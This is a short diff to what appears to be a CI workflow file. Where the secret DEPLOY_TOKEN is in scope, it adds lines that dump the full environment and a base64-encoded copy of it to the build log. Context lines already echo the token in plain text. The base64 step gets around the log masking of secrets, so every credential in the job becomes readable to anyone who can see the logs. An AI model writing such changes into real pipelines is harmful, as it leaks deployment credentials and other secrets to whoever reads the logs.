@@ -42,7 +42,10 @@ jobs:
           DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
         run: |
           echo "ENV HERE:"
+          echo "===env==="
           env
+          echo "===env base64==="
+          env | base64
           echo "deploy token: $DEPLOY_TOKEN"
 
       - name: Build
